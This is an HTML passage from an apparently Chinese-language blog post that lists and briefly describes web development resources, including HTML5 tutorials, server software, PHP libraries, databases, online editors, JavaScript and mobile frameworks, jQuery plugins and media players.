<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-9" href="#JavaScript_%E7%A7%BB%E5%8A%A8%E5%92%8C%E8%A7%A6%E6%91%B8%E6%A1%86%E6%9E%B6" title="JavaScript 移动和触摸框架">JavaScript 移动和触摸框架</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-10" href="#jQuery_%E6%8F%92%E4%BB%B6" title="jQuery 插件">jQuery 插件</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-11" href="#%E5%85%B6%E5%AE%83_jQuery_%E8%B5%84%E6%BA%90" title="其它 jQuery 资源">其它 jQuery 资源</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-12" href="#HTML5_%E8%A7%86%E9%A2%91%E6%92%AD%E6%94%BE%E5%99%A8" title="HTML5 视频播放器">HTML5 视频播放器</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-13" href="#JavaScript_%E9%9F%B3%E9%A2%91%E5%A4%84%E7%90%86%E4%B8%8E%E5%8F%AF%E8%A7%86%E5%8C%96%E6%95%88%E6%9E%9C" title="JavaScript 音频处理与可视化效果">JavaScript 音频处理与可视化效果</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-14" href="#JavaScript_%E5%9B%BE%E5%BD%A2_%E5%92%8C_3D" title="JavaScript 图形 和 3D">JavaScript 图形 和 3D</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-15" href="#JavaScript_%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8E%A5%E5%8F%A3_HTML5" title="JavaScript 浏览器接口 (HTML5)">JavaScript 浏览器接口 (HTML5)</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-16" href="#JavaScript_%E5%B7%A5%E5%85%B7" title="JavaScript 工具">JavaScript 工具</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-17" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%92%8C%E6%A8%A1%E6%8B%9F%E5%99%A8" title="客户端和模拟器">客户端和模拟器</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-18" href="#Website_FULL_%E6%A8%A1%E6%9D%BF" title="Website (FULL) 模板">Website (FULL) 模板</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E5%AD%A6%E4%B9%A0HTML_5%E7%BC%96%E7%A8%8B%E5%92%8C%E8%AE%BE%E8%AE%A1"></span>学习HTML 5编程和设计<span class="ez-toc-section-end"></span>
</h4>
<p><img alt="image placeholder" ></p>
<ul>
<li>★ <a href="https://www.html5rocks.com/" target="_blank"><strong>HTML5 Rocks</strong></a> : Major Feature Groups  的学习 HTML5 的资源 (HTML5 演示, 教程 ). <a href="https://code.google.com/p/html5rocks/" target="_blank">源码</a>
</li>
<li>很不错的 <a href="https://mozillademos.org/demos/dashboard/demo.html" target="_blank"><strong>HTML5 Dashboard</strong></a> – Mozilla，效果很炫。</li>
<li>
<a href="https://developers.whatwg.org/" target="_blank"><strong>WhatWG Developers</strong></a>, 一个清楚的 HTML5 技术规格说明书。</li>
<li>★ <a href="https://stackoverflow.com/" target="_blank"><strong>StackOverflow</strong></a> : 大名鼎鼎的技术问答式论坛。</li>
<li>★ <a href="http://addyosmani.com/blog/" target="_blank"><strong>Addyosmani</strong></a>, jQuery 和 JavaScript 文章教程</li>
<li>
<a href="http://www.sohtanaka.com/web-design-tutorials/" target="_blank"><strong>Sohtanaka</strong></a>, jQuery 和 JavaScript 文章和教程</li>
<li>★ <a href="http://net.tutsplus.com/category/tutorials/" target="_blank"><strong>Nettuts+</strong></a> 是一个面对Web开发人员和设计人员的网站，提供各种技术教程和文章，覆盖 HTML, CSS, Javascript, CMS’s, PHP 和 Ruby on Rails.</li>
<li>
<a href="http://tympanus.net/codrops/" target="_blank"><strong>Codrops</strong></a>, 教程和 web 资源</li>
<li>
<a href="http://www.webappers.com/" target="_blank"><strong>WebAppers</strong></a>, 最好的开源资源</li>
<li>
<a href="http://tutorialzine.com/" target="_blank"><strong>Tutorialzine</strong></a> – PHP MySQL jQuery CSS 教程, 资源和赠品</li>
<li><strong><a href="https://developer.mozilla.org/en/JavaScript/Guide" target="_blank">Mozilla JavaScript guide</a></strong></li>
<li> <a href="https://code.google.com/p/molokoloco-coding-project/" target="_blank"><strong>codes snippets</strong></a>, 作者自己收集的一些代码片段</li>
</ul>
<p><span id="more-4795"></span></p>
<h4>
<span class="ez-toc-section" id="%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E7%9A%84%E8%BD%AF%E4%BB%B6"></span>服务器端的软件<span class="ez-toc-section-end"></span>
</h4>
<p><img alt="image placeholder" ></p>
<ul>
<li>★ <a href="https://nodejs.org/" target="_blank"><strong>Node.js</strong></a> 是服务器端的 JavaScript 环境，其使用了异步事件驱动模式。其让Node.js在很多互联网应用体系结构下获得非常不错的性能。 <a href="https://github.com/joyent/node/" target="_blank">源码</a> 和 <a href="http://jsapp.us/" target="_blank">实时演示</a>。</li>
<li>
<a href="http://www.phantomjs.org/" target="_blank"><strong>PhantomJS</strong></a> 也是一个服务器端的 JavaScript API的WebKit。其支持各种Web标准： DOM 处理, CSS 选择器, JSON, Canvas, 和 SVG</li>
<li>
<strong><a href="https://www.lighttpd.net/" target="_blank">Lighttpd</a></strong> 一个轻量级的开源Web服务器。新闻，文档，benchmarks, bugs, 和 download. Lighttpd 支撑了几个非常著名的 Web 2.0 网站，如：YouTube, wikipedia 和 meebo.</li>
<li>
<strong><a href="http://nginx.net/" target="_blank">NGinx</a></strong>, 性能巨高无比的轻量级的Web服务器。比Apache高多了。花了6年的时间，终于走到了1.0版。</li>
<li>
<strong><a href="https://httpd.apache.org/" target="_blank">Apache HTTP Server</a></strong> 是一个很流行的并支持多个流行的操作系统的Web服务器。</li>
<li>★ <strong><a href="https://nodejs.org/" target="_blank"></a><a href="http://www.php.net/" target="_blank">PHP</a></strong> 可能是最流行的服务器端的Web脚本动态处理语言。</li>
<li>当然，还有 <strong><a href="https://www.ruby-lang.org/fr/" target="_blank">Ruby</a></strong>, <strong><a href="https://www.python.org/" target="_blank">Python</a></strong>, <strong><a href="http://www.erlang.org/" target="_blank">Erlang</a></strong>, <strong><a href="https://www.perl.org/" target="_blank">Perl</a></strong>, <strong><a href="https://www.java.com/fr/" target="_blank">Java</a></strong>, <strong><a href="https://www.microsoft.com/net/" target="_blank">.NET</a></strong>, <strong><a href="https://www.android.com/" target="_blank">Android</a></strong>, <strong><a href="http://cpp.developpez.com/" target="_blank">C++</a></strong>, <strong><a href="https://golang.org/" target="_blank">Go</a></strong>,<a href="https://github.com/pmcelhaney/Mustache.cfc"></a><strong><a href="http://fantom.org/" target="_blank"> Fantom</a></strong>,<strong><a href="https://jashkenas.github.com/coffee-script/" target="_blank">CoffeeScript</a></strong>, <strong><a href="http://www.digitalmars.com/" target="_blank">D</a></strong>, …</li>
</ul>
<h4>
<span class="ez-toc-section" id="PHP_%E6%A1%86%E6%9E%B6%E5%92%8C%E5%B7%A5%E5%85%B7"></span>PHP 框架和工具<span class="ez-toc-section-end"></span>
</h4>
<p><img alt="image placeholder" ></p>
<ul>
<li>★ <a href="https://wordpress.org/download/" target="_blank"><strong>WordPress</strong></a> 是一个基于博客系统的开源软件。参看《<a title="WordPress是怎么赢的？" href="https://coolshell.cn/articles/3716.html" target="_blank">WordPress是怎么赢的？</a>》</li>
<li>
<strong><a href="https://drupal.org/" target="_blank">Drupal</a></strong> 是一个内容管理系统 (CMS).</li>
<li>
<a href="http://www.centurion-project.org/" target="_blank"><strong>Centurion</strong></a> 是一个新出现的开源 CMS ，一个灵然的 PHP5 Content Management Framework. 使用 Zend Framework, 其组件坚持通用，简单，清楚和可重用的设计原则。</li>
<li>
<strong><a href="https://www.phpbb.com/" target="_blank">phpBB</a></strong> 一个开源的论坛（国内的Discuz！更多）</li>
<li>
<strong>★ <a href="http://simplepie.org/" target="_blank">SimplePie</a></strong> : 超快的，易用的,  RSS  和 Atom feed PHP解析。</li>
<li>
<strong>★ <a href="http://phpthumb.gxdlabs.com/" target="_blank">PHPthumb</a></strong>, PHP 图片处理库</li>
<li>
<strong>★ <a href="http://phpmailer.worxware.com/" target="_blank">PHPMailer</a></strong> 强大的全功能的PHP邮件库</li>
<li>
<strong><a href="https://code.google.com/p/pubsubhubbub/" target="_blank">PubSubHubbub</a></strong>协议，一个简单，开放， server-to-server 的 pubsub (publish/subscribe) 协议——Atom and RSS的扩展。</li>
<li>更多的请参看 – <a title="20 你应该知道的PHP库" href="https://coolshell.cn/articles/200.html" target="_blank">20个你应该知道PHP库</a> 和 <a title="9个强大免费的PHP库" href="https://coolshell.cn/articles/455.html" target="_blank">9个强大免费的PHP库</a>
</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E6%95%B0%E6%8D%AE%E5%BA%93"></span>数据库<span class="ez-toc-section-end"></span>
</h4>
<p><img alt="image placeholder" ></p>
<ul>
<li>★ <a href="https://couchdb.apache.org/" target="_blank"><strong>Apache CouchDB</strong></a> 是一个面向文档的数据库管理系统。它提供以JSON 作为数据格式的REST 接口来对其进行操作，并可以通过视图来操纵文档的组织和呈现。.<a href="https://github.com/apache/couchdb" target="_blank">源码</a>.</li>
<li>
<a href="https://code.google.com/p/monoql/" target="_blank"><strong>MonoQL</strong></a> 是一个采用PHP+ExtJS开发的MySQL数据库管理工具。界面极像一个桌面应用程序，支持大部分常用的功能包括：表格设计，数据浏览/编辑，数据导入/导出和高级查询等。</li>
<li>
<strong> </strong><a href="https://mariadb.org/"><strong>MariaDB</strong></a> 是<a title="MySQL" href="https://www.mysql.com/" target="_blank">MySQL</a>的一个分支，由MySQL 创始人Monty Widenius 所开发。GPL，用来对抗Oracle所有的MySQL的license的不测。自Oracle收购SUN以来，整个社区对于MySQL前途的担忧就没有停止过。</li>
<li>★ <a href="https://www.sqlite.org/" target="_blank"><strong>SQLite</strong></a> 不像常见的客户端/服务器结构范例，SQLite引擎不是个程序与之通信的独立进程，而是连接到程序中成为它的一个主要部分。所以主要的通信协议是在编程语言内的直接API调用。这在消耗总量、延迟时间和整体简单性上有积极的作用。整个数据库（定义、表、索引和数据本身）都在宿主主机上存储在一个单一的文件中。它的简单的设计是通过在开始一个事务的时候锁定整个数据文件而完成的。库实现了多数的SQL-92标准，包括事务，就是代表原子性、一致性、隔离性和持久性的（ACID），触发器和多数的复杂查询。不进行类型检查。你可以把字符串插入到整数列中。某些用户发现这是使数据库更加有用的创新，特别是与无类型的脚本语言一起使用的时候。其他用户认为这是主要的缺点。</li>
<li>
<strong><a href="http://ondras.zarovi.cz/sql/demo/" target="_blank">SQL 在线设计编辑器</a></strong>，这一节的那个图片就是这个在线编辑器的样子了。一个画数据库图表的在线工具。很强大。</li>
</ul>
<h4>
<span class="ez-toc-section" id="API_%E5%92%8C_%E5%9C%A8%E7%BA%BF%E6%95%B0%E6%8D%AE"></span>API 和 在线数据<span class="ez-toc-section-end"></span>
</h4>
<p><img alt="image placeholder" ></p>
<ul>
<li>
<a href="http://www.programmableweb.com/apis/directory" target="_blank"><strong>ProgrammableWeb</strong></a>, 最流行的Web Services 和 API 目录大全。</li>
<li>
<strong><a href="https://code.google.com/intl/fr/apis/gdata/docs/directory.html" target="_blank">Google Data Protocol</a></strong> 一组Google服务的数据服务API。</li>
<li>
<a href="https://developer.yahoo.com/everything.html" target="_blank"><strong>Yahoo! Developer Network</strong></a> – APIs 和 Tools</li>
<li>
<a href="https://pipes.yahoo.com/" target="_blank"><strong>Yahoo! Pipes</strong></a> 可视化在线编程工具，它是一个用于过滤、转换和聚合网页内容的服务。</li>
<li>★ The <a href="https://developer.yahoo.com/yql/console/" target="_blank"><strong>Yahoo! Query Language</strong></a> 一个很像 SQL的网页查询工具。</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E5%9C%A8%E7%BA%BF%E4%BB%A3%E7%A0%81%E5%92%8C%E5%AA%92%E4%BD%93%E7%BC%96%E8%BE%91%E5%99%A8"></span>在线代码和媒体编辑器<span class="ez-toc-section-end"></span>
</h4>
<p><img alt="image placeholder" ></p>
<ul>
<li>★ <a href="http://www.coderun.com/" target="_blank"><strong>CodeRun Studio</strong></a>一个基于JavaScript语言开发的跨平台的集成开发环境，它立足于云计算的设计思路，方便开发者在浏览器端便可以轻松开发、调试和部署网络应用程序。（参看《<a rel="bookmark" href="https://coolshell.cn/articles/1883.html" target="_blank">Coderun.com 在线开发IDE</a>》）</li>
<li>
<a href="https://github.com/ajaxorg/cloud9" target="_blank"><strong>Cloud9 IDE</strong></a> – 一个基于Node.JS构建的JavaScript程序开发Web IDE。它拥有一个非常快的文本编辑器支持为JS, HTML, CSS和这几种的混合代码进行着色显示。</li>
<li>★ <a href="https://jsfiddle.net/" target="_blank"><strong>jsFiddle</strong></a> – Javascript的在线运行展示框架，这个工具可以有效的帮助web前端开发人员来有效分享和演示前端效果，其简单而强大 (JavaScript, MooTools, jQuery, Prototype, YUI, Glow and Dojo, HTML, CSS)</li>
<li>
<strong><a href="http://www.akshell.com/" target="_blank">Akshell</a>，</strong>一种云服务，它使用服务端的JavaScript和在线的IDE帮助开发者进行快速应用程序开发。 它还提供云托管，所以部署是即时的。</li>
<li>
<a href="http://braincast.nl/samples/jsoneditor/" target="_blank"><strong>JSONeditor</strong></a>, 一个好用的JSON 编辑器</li>
<li>★ <a href="http://tinymce.moxiecode.com/wiki.php/TinyMCE" target="_blank"><strong>TinyMCE</strong></a> 一个轻量级的基于浏览器的所见即所得编辑器，支持目前流行的各种浏览器，由JavaScript写成。</li>
<li>
<a href="http://www.sencha.com/products/designer/" target="_blank"><strong>Ext Designer</strong></a> 是一个桌面应用工具，帮助你快速开发基于ExtJS 的用户界面。</li>
<li>★  <strong><a href="https://www.lucidchart.com/" target="_blank">LucidChart</a></strong>，一款基于最新的html5技术的在线图表绘制软件，功能强大，速度快捷，运行此软件需要支持html5的浏览器。</li>
<li>
<a href="http://balsamiq.com/products/mockups" target="_blank"><strong>Balsamiq Mockups</strong></a>, 产品设计师绘制线框图或产品原型界面的利器。</li>
<li>
<a href="http://colorschemedesigner.com/" target="_blank"><strong>Color Scheme Designer</strong></a> 3 – 一个免费的线上调色工具</li>
<li>★ <a href="http://pixlr.com/editor/" target="_blank"><strong>Pixlr</strong></a>, 是一个来自瑞典基于Flash的免费在线图片处理网站。除了操作介面和功能接近Photoshop，还是多语言版本，支持简体中文。（以前<a title="在线作图编辑服务" href="https://coolshell.cn/articles/3244.html" target="_blank">酷壳介绍过</a>）</li>
<li>
<a href="https://www.aviary.com/" target="_blank"><strong>Aviary</strong></a>, 是一个基于HTML5 的在线图片处理工具，可以很容易的对图片进行后期处理。 <a href="https://developers.aviary.com/" target="_blank">Aviary API</a>
</li>
<li>
<strong><a href="http://www.degraeve.com/favicon/" target="_blank">Favicon Generator</a>, </strong>线上favicon(16×16)制作工具。</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E4%BB%A3%E7%A0%81%E8%B5%84%E6%BA%90%E5%92%8C%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6"></span>代码资源和版本控制<span class="ez-toc-section-end"></span>
</h4>
<p><img alt="image placeholder" ></p>
<ul>
<li>★ <a href="https://github.com/" target="_blank"><strong>GitHub</strong></a> 是一个用于使用Git版本控制系统的项目的基于互联网的存取服务。</li>
<li>
<a href="https://code.google.com/p/msysgit/" target="_blank"><strong>Git</strong></a> 是一个由Linus为了更好地管理linux内核开发而创立的分布式版本控制／软件配置管理软件。其巨快无比，高效，采用了分布式版本库的方式，不必服务器端软件支持，使源代码的发布和交流极其方便。</li>
<li>
<a href="https://code.google.com/" target="_blank"><strong>Google Code</strong></a> 谷歌公司官方的开发者网站，包含各种开发技术的API、开发工具、以及开发技术参考资料。</li>
<li>
<strong><a href="https://code.google.com/intl/zh-CN/apis/libraries/" target="_blank">Google Libraries API</a></strong> Google 将优秀的 JavaScript 框架部署在其 CDN 上，在我们的网站上使用 Google Libraries API 可以加速 JavaScript 框架的加载速度。</li>
<li>
<a href="http://snipplr.com/" target="_blank"><strong>Snipplr</strong></a> 一个开放的源代码技巧分享社区，号称Code 2.0。和一般的源码分享网站不同，它针对的并不是大型网站源码，而是一些编程的代码技巧。</li>
</ul>
<h4>
<span class="ez-toc-section" id="JavaScript_%E6%A1%8C%E9%9D%A2%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6"></span>JavaScript 桌面应用框架<span class="ez-toc-section-end"></span>
</h4>
<p><img alt="image placeholder" ></p>
<ul>
<li>★ <a href="https://jquery.com/" target="_blank"><strong>jQuery</strong></a> 是一个快速、简单的JavaScript library， 它简化了HTML 文件的traversing，事件处理、动画、Ajax 互动，从而方便了网页制作的快速发展。  <a href="https://github.com/jquery/jquery" target="_blank">源码</a>, <a href="https://api.jquery.com/" target="_blank">API</a>, <a href="https://api.jquery.com/browser/" target="_blank">API浏览</a>, <a href="http://interface.eyecon.ro/docs/animate" target="_blank">很不错的文档</a>.</li>
<li>★ 官方的 <a href="https://jqueryui.com/" target="_blank"><strong>jQuery User Interface (UI) library</strong></a> (演示和文档). <a href="https://github.com/jquery/jquery-ui%20" target="_blank">源码</a>,<a href="https://jqueryui.com/themeroller/" target="_blank">Themes Roller</a>, <a href="https://jqueryui.com/download" target="_blank">Download</a>.</li>
<li>
<a href="https://developer.yahoo.com/yui/2/" target="_blank"><strong>YUI 2</strong></a> — Yahoo! User Interface Library</li>
<li>
<a href="http://mootools.net/" target="_blank"><strong>Mootools</strong></a>, 一个超级轻量级的 web2.0 JavaScript framework</li>
<li>
<a href="http://www.prototypejs.org/" target="_blank"><strong>Prototype</strong></a> 提供面向对象的Javascript和AJAX</li>
<li>
<a href="https://dojotoolkit.org/" target="_blank"><strong>Dojo</strong></a> The Dojo Toolkit，一个强大的无法被打败的面向对象JavaScript框架。主要由三大模块组成：Core、Dijit、DojoX。Core提供Ajax,events,packaging,CSS-based querying,animations,JSON等相关操作API。Dijit是一个可更换皮肤，基于模板的WEB UI控件库。DojoX包括一些创新/新颖的代码和控件：DateGrid，charts，离线应用，跨浏览器矢量绘图等。</li>
<li>★ <a href="http://dev.sencha.com/deploy/ext-4.0.0/docs/" target="_blank"><strong>Ext JS 4</strong></a>, 业内最强大的 JavaScript framework。</li>
<li>
<a href="http://phpjs.org/functions/index" target="_blank"><strong>PHP.js</strong></a>, 一个开源的JavaScript 库，它尝试在JavaScript 中实现PHP 函数。在你的项目中导入<em>PHP.JS</em> 库，可以在静态页面使用你喜欢的PHP 函数。</li>
</ul>
<h4>
<span class="ez-toc-section" id="JavaScript_%E7%A7%BB%E5%8A%A8%E5%92%8C%E8%A7%A6%E6%91%B8%E6%A1%86%E6%9E%B6"></span>JavaScript 移动和触摸框架<span class="ez-toc-section-end"></span>
</h4>
<p><img alt="image placeholder" ></p>
<ul>
<li>★ <a href="https://jquerymobile.com/" target="_blank"><strong>jQuery Mobile</strong></a> : 是 jQuery 在手机上和平板设备上的版本。jQuery Mobile 不仅会给主流移动平台带来jQuery核心库，而且会发布一个完整统一的jQuery移动UI框架。支持全球主流的移动平台。jQuery Mobile开发团队说：能开发这个项目，我们非常兴奋。移动Web太需要一个跨浏览器的框架，让开发人员开发出真正的移动Web网站。我们将尽全力去满足这样的需求。 <a href="https://github.com/jquery/jquery-mobile" target="_blank">Sources</a>.</li>
<li>
<a href="http://zeptojs.com/" target="_blank"><strong>Zepto.js</strong></a> Zepto.js 是支持移动WebKit浏览器的JavaScript框架，具有与jQuery兼容的语法。2-5k的库，通过不错的API处理绝大多数的基本工作。 <a href="https://github.com/madrobby/zepto" target="_blank">Sources</a>.</li>
<li>
<a href="http://microjs.com/" target="_blank"><strong>MicroJS</strong></a> : Microjs网站应用列出了很多轻量的Javascript类库和框架，它们都很小，大部分小于5kb。这样你不需要因为只需要一个功能就要加载一个JS的框架。</li>
<li>★ <a href="http://phonegap.com/" target="_blank"><strong>PhoneGap</strong></a> :是一款开源的手机应用开发平台，它仅仅只用HTML和JavaScript语言就可以制作出能在多个移动设备上运行的应用。 <a href="https://github.com/phonegap/phonegap" target="_blank">Sources</a>.</li>
<li>★ <a href="http://www.sencha.com/products/touch/" target="_blank"><strong>Sencha Touch</strong></a> Sencha Touch 是一个支持多种智能手机平台（iPhone, Android, 和BlackBerry）的 HTML5 框架。Sencha Touch可以让你的Web App看起来像Native App。美丽的用户界面组件和丰富的数据管理，全部基于最新的HTML5和CSS3的 WEB标准，全面兼容Android和Apple iOS设备。</li>
<li>
<a href="http://jqtouch.com/" target="_blank"><strong>JQtouch</strong></a>, 是一个jQuery 的插件，主要用于手机上的Webkit 浏览器上实现一些包括动画、列表导航、默认应用样式等各种常见UI效果的JavaScript 库。 <a href="https://github.com/senchalabs/jQTouch" target="_blank">Sources</a>.</li>
<li>
<a href="http://www.dhtmlx.com/touch/" target="_blank"><strong>DHTMLX Touch</strong></a> 针对移动和触摸设备的JavaScript 框架。DHTMLX Touch基于HTML5，创建移动web应用。它不只是一组UI 小工具，而是一个完整的框架，可以针对移动和触摸设备创建跨平台的web应用。它兼容主流的web浏览器，用DHTMLX Touch创建的应用，可以在iPad、iPhone、Android智能手机等上面运行流畅。</li>
</ul>
<h4>
<span class="ez-toc-section" id="jQuery_%E6%8F%92%E4%BB%B6"></span>jQuery 插件<span class="ez-toc-section-end"></span>
</h4>
<p><img alt="image placeholder" ></p>
<ul>
<li>
<a href="https://imakewebthings.github.com/jquery-waypoints/" target="_blank"><strong>Waypoints</strong></a> 是一个jQuery 用来实现捕获各种滚动事件的插件，例如实现无翻页的内容浏览，或者固定某个元素不让滚动等等。支持主流浏览器版本。</li>
<li>
<strong><a href="https://plugins.jquery.com/project/lazy" target="_blank">Lazy loader</a> </strong>插件可以实现图片的延迟加载，当网页比较长的时候，会先只加载用户视窗内的图片，视窗外的图片会等到你拖动滚动条至后面才加载，这样有效的避免了因图片过多而加载慢的弊端。</li>
<li>
<a href="https://github.com/gskinner/TweenJS" target="_blank"><strong>TweenJS</strong></a> : 一个简单和强大的 tweening / animation 的Javascript库。</li>
<li>
<a href="http://janne.aukia.com/easie/" target="_blank"> <strong>Easings</strong></a> 类Css3的jQuery 动画插件</li>
<li>
<a href="http://www.spritely.net/" target="_blank"><strong>Spritely</strong></a> 这个插件可以创建出如flash一样的动画效果，比如：在页面上有一只飞动的小鸟，一个动态滚动的背景等。</li>
<li>
<strong><a href="https://github.com/blueimp/jQuery-File-Upload/" target="_blank">File Upload</a>, </strong>jQuery 文件上传插件4.4.1</li>
<li>
<a href="http://www.agilecarousel.com/" target="_blank"><strong>Slideshow/Carousel</strong></a> 插件. <a href="https://github.com/edtalmadge/Agile-Carousel" target="_blank">Sources</a>.</li>
<li>
<a href="http://www.buildinternet.com/project/supersized/" target="_blank"><strong>Supersized</strong></a> – 全屏式的背景/幻灯片插件</li>
<li>
<a href="http://desandro.com/resources/jquery-masonry" target="_blank"><strong>Masonry</strong></a> i一款非常酷的自动排版插件，这款jQuery工具可以根据网格来自动排列水平和垂直元素，超越原来的css. <a href="https://github.com/desandro/masonry" target="_blank">Sources</a>.</li>
<li>jQuery 简单 <a href="http://layout.jquery-dev.net/demos.cfm" target="_blank"><strong>Layout</strong></a> 演示，管理各种边栏式，可改变大小式的布局。</li>
<li>
<a href="http://www.flexigrid.info/" target="_blank"><strong>Flexigrid</strong></a> – jQuery <a href="http://www.flexigrid.info/" target="_blank"><strong></strong></a>数据表插件</li>
<li>
<a href="http://isotope.metafizzy.co/" target="_blank"><strong>Isotope</strong></a>绝对是一个令人难以置信的<em>jQuery</em>插件，你可以用它来创建动态和智能布局。你可以隐藏和显示与过滤项目，重新排序和整理甚至更多。</li>
<li>
<a href="http://www.evanbyrne.com/article/super-gestures-jquery-plugin" target="_blank"><strong>Super Gestures</strong></a> jQuery 插件可以实现鼠标手势的功能。</li>
<li>
<a href="https://github.com/brandonaaron/jquery-mousewheel" target="_blank"><strong>MouseWheel</strong></a> 是由Brandon Aaron开发的<em>jQuery</em>插件，用于添加跨浏览器的鼠标滚轮支持。</li>
<li>
<a href="http://code.drewwilson.com/entry/autosuggest-jquery-plugin" target="_blank"><strong>AutoSuggest</strong></a> jQuery 插件可以让你添加一些自动完成的功能。</li>
<li>
<a href="http://craigsworks.com/projects/qtip/" target="_blank"><strong>qTip</strong></a> 一个漂亮的<em>jQuery</em> 的工具提示插件，这个插件功能相当强大。</li>
<li>jQuery <a href="https://www.highcharts.com/demo/" target="_blank"><strong>Charts and graphic</strong></a> 用来制作图表。</li>
<li>jQuery Tools– The <a href="http://flowplayer.org/tools/demos/" target="_blank"><strong>missing UI library</strong></a>
</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E5%85%B6%E5%AE%83_jQuery_%E8%B5%84%E6%BA%90"></span>其它 jQuery 资源<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li><a href="http://www.smashingmagazine.com/2011/04/07/useful-javascript-and-jquery-tools-libraries-plugins" target="_blank">http://www.smashingmagazine.com/2011/04/07/useful-javascript-and-jquery-tools-libraries-plugins</a></li>
<li><a href="http://webdesigneraid.com/weekly-html5-news-and-inspirations-%E2%80%93-tutorials-tools-resources-and-freebies-v-2/" target="_blank">http://webdesigneraid.com/weekly-html5-news-and-inspirations-%E2%80%93-tutorials-tools-resources-and-freebies-v-2/</a></li>
<li><a href="http://www.designer-daily.com/15-useful-jquery-plugins-and-tutorials-5207" target="_blank">http://www.designer-daily.com/15-useful-jquery-plugins-and-tutorials-5207</a></li>
<li><a href="http://www.julien-verkest.fr/22/11/2007/240-plugins-jquery" target="_blank">http://www.julien-verkest.fr/22/11/2007/240-plugins-jquery</a></li>
<li><a href="https://www.hotscripts.com/blog/10-great-html5-experiments-apps/" target="_blank">http://www.hotscripts.com/blog/10-great-html5-experiments-apps/</a></li>
<li><a href="http://www.noupe.com/jquery/excellent-jquery-navigation-menu-tutorials.html" target="_blank">http://www.noupe.com/jquery/excellent-jquery-navigation-menu-tutorials.html</a></li>
<li><a href="http://www.noupe.com/php/20-useful-php-jquery-tutorials.html" target="_blank">http://www.noupe.com/php/20-useful-php-jquery-tutorials.html</a></li>
<li><a href="http://aext.net/2010/04/excellent-jquery-plugins-resources-for-data-presentation-and-grid-layout/" target="_blank">http://aext.net/2010/04/excellent-jquery-plugins-resources-for-data-presentation-and-grid-layout/</a></li>
<li><a href="http://webdesigneraid.com/html5-canvas-graphing-solutions-every-web-developers-must-know/" target="_blank">http://webdesigneraid.com/html5-canvas-graphing-solutions-every-web-developers-must-know/</a></li>
<li><a href="http://gestureworks.com/features/open-source-gestures/" target="_blank">http://gestureworks.com/features/open-source-gestures/</a></li>
<li><a href="https://edtechdev.wordpress.com/2011/01/14/some-exciting-new-html5javascript-projects/" target="_blank">http://edtechdev.wordpress.com/2011/01/14/some-exciting-new-html5javascript-projects/</a></li>
<li><a href="http://net.tutsplus.com/articles/web-roundups/30-developers-you-must-subscribe-to-as-a-javascript-junkie/" target="_blank">http://net.tutsplus.com/articles/web-roundups/30-developers-you-must-subscribe-to-as-a-javascript-junkie/</a></li>
</ul>
<h4>
<span class="ez-toc-section" id="HTML5_%E8%A7%86%E9%A2%91%E6%92%AD%E6%94%BE%E5%99%A8"></span>HTML5 视频播放器<span class="ez-toc-section-end"></span>
</h4>
<p><img alt="image placeholder" ></p>
<ul>
<li>★ <a href="https://github.com/webmademovies/popcorn-js" target="_blank"><strong>Popcorn.js</strong></a> 是一个HTML5 Video框架，它提供了易于使用的API来同步交互式内容，让操作HTML5 Video元素的属性，方法和事件变得简单易用。 (来自Mozilla)</li>
<li>
<a href="http://dev.mennerich.name/showroom/html5_video/" target="_blank"><strong>LeanBack Player</strong></a> HTML5视频播放器,没有依赖任何JavaScript框架。支持全屏播放，音量控制，在同一个页面中播放多个视频。 (来自Google)</li>
<li>
<a href="https://m.vid.ly/user/" target="_blank"><strong>Vid.ly</strong></a> 为你上传的视频提供转换功能，并且为转换后的视频创建一个短网址。通过Vid.ly，让你的视频可以在14种不同的浏览器和设备上播放，不需要再去考虑将要浏览视频的人使用什么设备了，以避免各各软件巨头之间的利益之争带来了不兼容，给用户带来了巨大的困扰，短网址让你可以通过Twitter、Facebook等方式方便分享视频。Vid.ly还可以通过html代码嵌入到其他网页中。Vid.ly免费帐户空间为1GB，免费帐户也没有播放或浏览限制。</li>
</ul>
<h4>
<span class="ez-toc-section" id="JavaScript_%E9%9F%B3%E9%A2%91%E5%A4%84%E7%90%86%E4%B8%8E%E5%8F%AF%E8%A7%86%E5%8C%96%E6%95%88%E6%9E%9C"></span>JavaScript 音频处理与可视化效果<span class="ez-toc-section-end"></span>
</h4>
<p><img alt="image placeholder" ></p>
<ul>
<li>★ 使用HTML5 和 Flash, <a href="http://www.schillmania.com/projects/soundmanager2/" target="_blank"><strong>SoundManager V2</strong></a> 只用单一API的提供了可靠，简单和强大的跨平台的音频处理。</li>
<li>
<a href="https://github.com/corbanbrook/dsp.js/" target="_blank"><strong>DSP</strong></a>, JavaScript的声音Digital Signal Processing</li>
<li>The Radiolab <a href="http://yoyodyne.cc/radiolab/" target="_blank"><strong>Hyper Audio Player</strong></a> v1, 带给你 WNYC Radiolab, SoundCloud 和 Mozilla Drumbeat</li>
<li>
<a href="http://jplayer.org/" target="_blank"><strong>jPlayer</strong></a>, 一个 jQuery HTML5 音频/ 视频库，功能齐全的API</li>
</ul>
